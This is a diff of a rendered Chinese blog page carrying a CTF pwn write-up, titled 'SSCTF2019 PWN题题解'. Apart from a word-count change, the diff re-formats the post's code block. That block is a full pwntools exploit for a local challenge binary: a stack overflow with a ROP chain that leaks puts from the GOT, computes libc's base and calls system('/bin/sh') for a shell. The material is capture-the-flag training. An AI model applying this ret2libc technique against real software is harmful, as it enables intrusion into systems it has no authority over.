@@ -29,7 +29,7 @@
         "mainEntityOfPage": {
             "@type": "WebPage",
             "@id": "https:\/\/www.v4ler1an.com\/2020\/11\/roarctf\/"
-        },"image": ["https:\/\/www.v4ler1an.com\/images\/personal_logo.png"],"genre": "posts","keywords": "pwn","wordcount":  522 ,
+        },"image": ["https:\/\/www.v4ler1an.com\/images\/personal_logo.png"],"genre": "posts","keywords": "pwn","wordcount":  521 ,
         "url": "https:\/\/www.v4ler1an.com\/2020\/11\/roarctf\/","datePublished": "2020-11-25T21:57:40+08:00","dateModified": "2020-11-26T16:45:40+08:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
             "@type": "Organization",
             "name": "xxxx","logo": "https:\/\/www.v4ler1an.com\/images\/avatar.png"},"author": {
@@ -124,7 +124,7 @@
             <div class="toc-content" id="toc-content-auto"></div>
         </div><article class="page single"><h1 class="single-title animated flipInX">SSCTF2019 PWN题题解</h1><div class="post-meta">
             <div class="post-meta-line"><span class="post-author"><a href="https://www.v4ler1an.com" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw"></i>有毒</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/ctf/"><i class="far fa-folder fa-fw"></i>CTF</a></span></div>
-            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2020-11-25">2020-11-25</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 522 字&nbsp;
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2020-11-25">2020-11-25</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 521 字&nbsp;
                 <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 2 分钟&nbsp;<span id="/2020/11/roarctf/" class="leancloud_visitors" data-flag-title="SSCTF2019 PWN题题解">
                         <i class="far fa-eye fa-fw"></i>&nbsp;<span class=leancloud-visitors-count></span>&nbsp;次阅读
                     </span>&nbsp;</div>
@@ -209,43 +209,41 @@
 </span><span class="lnt">30
 </span><span class="lnt">31
 </span><span class="lnt">32
-</span><span class="lnt">33
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">from pwn import *
-
-context.log_level = &#39;debug&#39;
-
-p = process(&#39;./stackpwn&#39;)
-
-offset = 0x18   #0x10+0x8
-pop_rdi_ret = 0x0000000000400933  #ROPgadet : rdi
-bin_sh = 0x0000000000400954   # address of /bin/sh
-
-elf = ELF(&#34;./stackpwn&#34;)
-libc = elf.libc     # leak libc
-
-payload = &#39;A&#39;*offset + p64(pop_rdi_ret) + p64(elf.got[&#39;puts&#39;]) + p64(elf.plt[&#39;puts&#39;]) + p64(0x00000000004007E7) #last address is main address
-p.recvuntil(&#34;instructions...\n&#34;)
-
-p.sendline(payload)
-
-#get puts address
-puts_addr = u64(p.recv(6).ljust(8,&#39;\x00&#39;))
-
-#get libc address
-puts_base = libc.symbols[&#39;puts&#39;]
-libc_base = puts_addr - puts_base
-
-#get system address
-sys_addr = libc_base + libc.symbols[&#39;system&#39;]
-
-#second loop
-payload2 = &#39;A&#39;*offset + p64(pop_rdi_ret) + p64(bin_sh) + p64(sys_addr)
-p.sendline(payload2)
-p.interactive()
-
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">from pwn import *
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">context.log_level = &#39;debug&#39;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">p = process(&#39;./stackpwn&#39;)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">offset = 0x18   #0x10+0x8
+</span></span><span class="line"><span class="cl">pop_rdi_ret = 0x0000000000400933  #ROPgadet : rdi
+</span></span><span class="line"><span class="cl">bin_sh = 0x0000000000400954   # address of /bin/sh
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">elf = ELF(&#34;./stackpwn&#34;)
+</span></span><span class="line"><span class="cl">libc = elf.libc     # leak libc
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">payload = &#39;A&#39;*offset + p64(pop_rdi_ret) + p64(elf.got[&#39;puts&#39;]) + p64(elf.plt[&#39;puts&#39;]) + p64(0x00000000004007E7) #last address is main address
+</span></span><span class="line"><span class="cl">p.recvuntil(&#34;instructions...\n&#34;)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">p.sendline(payload)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">#get puts address
+</span></span><span class="line"><span class="cl">puts_addr = u64(p.recv(6).ljust(8,&#39;\x00&#39;))
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">#get libc address
+</span></span><span class="line"><span class="cl">puts_base = libc.symbols[&#39;puts&#39;]
+</span></span><span class="line"><span class="cl">libc_base = puts_addr - puts_base
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">#get system address
+</span></span><span class="line"><span class="cl">sys_addr = libc_base + libc.symbols[&#39;system&#39;]
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">#second loop
+</span></span><span class="line"><span class="cl">payload2 = &#39;A&#39;*offset + p64(pop_rdi_ret) + p64(bin_sh) + p64(sys_addr)
+</span></span><span class="line"><span class="cl">p.sendline(payload2)
+</span></span><span class="line"><span class="cl">p.interactive()
+</span></span></code></pre></td></tr></table>
 </div>
 </div></div><div class="post-footer" id="post-footer">
     <div class="post-info">
